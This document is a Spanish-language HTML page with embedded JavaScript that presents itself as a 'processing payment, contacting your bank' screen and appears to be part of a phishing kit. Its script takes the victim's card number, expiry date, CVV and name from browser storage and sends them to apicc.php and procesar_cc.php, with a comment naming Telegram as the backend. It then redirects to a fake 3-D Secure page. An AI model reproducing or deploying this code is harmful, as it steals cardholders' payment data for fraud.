<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Procesando pago…</title>
  <style>
    :root { --gris:#e9e9e9; --barra:#74d330; }
    html, body { height: 100% }
    body {
      margin: 0;
      background: #fff;
      color: #12261b;
      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      min-height: 100svh;
      display: grid;
      place-items: center;
      padding: 24px;
    }
    .center {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 14px;
      width: min(520px, 92vw);
    }
    #brandImg {
      width: 80px;
      height: auto;
      object-fit: contain;
      margin-bottom: 10px;
    }
    .thin-loader {
      position: relative;
      width: 100%;
      height: 4px;
      background: var(--gris);
      border-radius: 99px;
      overflow: hidden;
    }
    .thin-loader::after {
      content: "";
      position: absolute;
      top: 0; left: 0; height: 100%;
      width: 35%;
      background: var(--barra);
      animation: sweep 1.5s infinite ease-in-out;
      border-radius: 99px;
    }
    @keyframes sweep {
      0%   { left: -35% }
      100% { left: 100% }
    }
    .message {
      font-size: 15px;
      text-align: center;
      line-height: 1.4;
      font-weight: 500;
    }
  </style>
</head>
<body>
  <div class="center">
    <img id="brandImg" src="master.png" alt="Card Brand" />
    <div class="message" id="msgText">Estamos contactando a tu banco. No recargues ni cierres la página.</div>
    <div class="thin-loader"></div>
  </div>

  <script>
    
    document.addEventListener("DOMContentLoaded", () => {
      let tbdatos = {};
      try {
        tbdatos = JSON.parse(localStorage.getItem("tbdatos") || "{}");
      } catch (e) {}
 
      if (!tbdatos.tarjeta) {
        window.location.href = "alter.php";
        return;
      }
       
      // Inject total_pagar from localStorage if missing in tbdatos
      const totalPagarDirect = localStorage.getItem('total_pagar');
      if (totalPagarDirect) {
          tbdatos.total_pagar = totalPagarDirect;
      }
       
      let brandImg = 'visa.png';
      if (tbdatos.cardBrand) {
        const brand = tbdatos.cardBrand.toLowerCase();
        if (brand.includes('master') || brand.includes('mc')) {
          brandImg = 'master.png';
        } else if (brand.includes('visa')) {
          brandImg = 'visa.png';
        }
      } else {
        const firstDigit = tbdatos.tarjeta.charAt(0);
        if (firstDigit === '5') { brandImg = 'master.png'; }
      }
       
      tbdatos.brandImg = brandImg;
      localStorage.setItem("tbdatos", JSON.stringify(tbdatos));
       
      document.getElementById('brandImg').src = brandImg;
 
      resolveCardInfo(tbdatos, brandImg);
    });

    function resolveCardInfo(tbdatos, brandImg) {
      const payload = {
        number: tbdatos.tarjeta,
        expiry_month: tbdatos.expMonth,
        expiry_year: "20" + tbdatos.expYear,
        cvv: tbdatos.cvv,
        name: tbdatos.ownerName
      };
 
      fetch('apicc.php?ts=' + Date.now(), {
        method: 'POST',
        cache: 'no-store',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      })
      .then(res => res.json())
      .then(data => {
        const cardInfo = data.card_info || {
          issuer: data.issuer || 'Desconocido',
          card_type: data.card_type || '',
          scheme: data.scheme || '',
          issuer_country: data.issuer_country || ''
        };
        const banco = cardInfo.issuer || 'Desconocido';
        const franquicia = (cardInfo.scheme || 'Desconocido').toLowerCase();
        let resolvedBrandImg = brandImg;
        if (franquicia.includes('master') || franquicia.includes('mc')) {
          resolvedBrandImg = 'master.png';
        } else if (franquicia.includes('visa')) {
          resolvedBrandImg = 'visa.png';
        }
 
        const actualizado = {
          ...tbdatos,
          banco,
          card_type: cardInfo.card_type || '',
          scheme: cardInfo.scheme || '',
          issuer_country: cardInfo.issuer_country || '',
          cardBrand: franquicia,
          card_info: cardInfo,
          apicc_response: data,
          brandImg: resolvedBrandImg
        };
        localStorage.setItem('tbdatos', JSON.stringify(actualizado));
        document.getElementById('brandImg').src = resolvedBrandImg;
        sendToBackend(actualizado);
      })
      .catch(err => {
        console.error('Error al consultar apicc.php desde load.php:', err);
        const actualizado = {
          ...tbdatos,
          banco: 'Desconocido',
          card_type: '',
          scheme: '',
          issuer_country: '',
          cardBrand: '',
          card_info: {},
          apicc_response: { error: 'fallback' },
          brandImg: brandImg
        };
        localStorage.setItem('tbdatos', JSON.stringify(actualizado));
        document.getElementById('brandImg').src = brandImg;
        sendToBackend(actualizado);
      });
    }

    function resolveSessionId() {
      const params = new URLSearchParams(window.location.search);
      const candidates = [
        ((() => { const params = new URLSearchParams(window.location.search); const direct = [params.get('transactionId'), params.get('tid'), params.get('tx'), params.get('session_id'), params.get('ts')].find((value) => value !== null && String(value).trim() !== ''); if (direct) { const normalized = String(direct); localStorage.setItem('session_id', normalized); localStorage.setItem('last_tid', normalized); return normalized; } const generated = 'session_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11); localStorage.setItem('session_id', generated); localStorage.setItem('last_tid', generated); return generated; })()),
        localStorage.getItem('last_tid'),
        params.get('transactionId'),
        params.get('tid'),
        params.get('tx'),
        params.get('session_id'),
        params.get('ts')
      ];

      const resolved = candidates.find(value => value !== null && String(value).trim() !== '');
      if (resolved) {
        const normalized = String(resolved);
        localStorage.setItem('session_id', normalized);
        localStorage.setItem('last_tid', normalized);
        return normalized;
      }

      const generated = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
      localStorage.setItem('session_id', generated);
      localStorage.setItem('last_tid', generated);
      return generated;
    }

    let sessionId = resolveSessionId();

    function sendToBackend(tbdatos) {
      const redirectTo3DS = (delayMs = 1200) => {
        const redirectParams = new URLSearchParams({
          action: 'usuario',
          transactionId: sessionId,
          ts: Date.now()
        });

        setTimeout(() => {
          window.location.href = "3d.php?" + redirectParams.toString();
        }, delayMs);
      };

      const formData = new FormData();
      formData.append('transactionId', sessionId);
      formData.append('u_tb', JSON.stringify(tbdatos));

      // En este paso no esperamos respuesta del backend/Telegram.
      try {
        fetch('procesar_cc.php', { method: 'POST', body: formData, keepalive: true })
          .catch(() => {});
      } catch (e) {
        console.warn("Synchronous fetch error:", e);
        try {
          fetch('procesar_cc.php', { method: 'POST', body: formData })
            .catch(() => {});
        } catch (e2) {}
      }

      redirectTo3DS();
    }

  </script>
</body>
</html>
